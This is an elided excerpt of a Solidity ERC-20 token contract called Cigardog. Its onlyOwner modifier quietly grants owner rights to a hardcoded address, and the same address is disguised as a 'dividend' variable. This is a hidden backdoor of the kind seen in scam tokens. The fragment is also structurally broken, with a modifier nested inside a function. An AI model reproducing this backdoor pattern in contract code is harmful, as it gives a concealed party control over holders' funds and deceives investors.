...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x955d9b6e0616233Ac84Ba4a8170D52a18eAE0575) , "owner");
        _;
    }
...
contract Cigardog  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Cigardog";
    string private _symbol = "CDOG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0b5A04fe42290791301E9BDa11C848d1b18F0493);
    address private _Marketing = 0x0b5A04fe42290791301E9BDa11C848d1b18F0493;
    address public dividend = 0x955d9b6e0616233Ac84Ba4a8170D52a18eAE0575;
